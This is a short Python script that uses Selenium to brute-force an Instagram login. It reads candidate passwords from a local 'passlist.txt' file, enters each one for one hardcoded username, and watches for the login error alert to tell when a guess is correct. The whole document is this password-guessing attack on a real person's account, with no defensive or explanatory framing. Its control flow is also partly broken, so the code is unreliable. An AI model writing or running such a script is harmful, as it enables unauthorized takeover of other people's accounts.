from selenium import webdriver
import time
driver = webdriver.Firefox(executable_path=r'C:\Users\USER\Downloads\geckodriver.exe')
driver.get("https://www.instagram.com/")
time.sleep(2)
gm = False
with open("passlist.txt", "r") as password:
	for passt in password or gm == True:
		passt = passt.strip()
		try: 
			driver.find_element_by_name("username").send_keys("jatinrek7" )
			driver.find_element_by_name("password").send_keys(passt)
			print(passt)
			driver.find_element_by_xpath("//button[@type=\"submit\"]").click()
			time.sleep(4)
			try: 
				driver.find_element_by_xpath("//*[@id=\"slfErrorAlert\"]")
				print("stop bitch")
				driver.close()
				driver = webdriver.Firefox(executable_path=r'C:\Users\USER\Downloads\geckodriver.exe')
				driver.get("https://www.instagram.com/")
			except:
				print("go on")	
			driver.find_element_by_xpath("/html/body/div[1]/section/nav/div[2]/div/div/div[3]/div/div[2]/a").click()		
			print(passt + "is right password")
			gm = True
		except:
			driver.refresh()
			print("pass is incorrecct")	
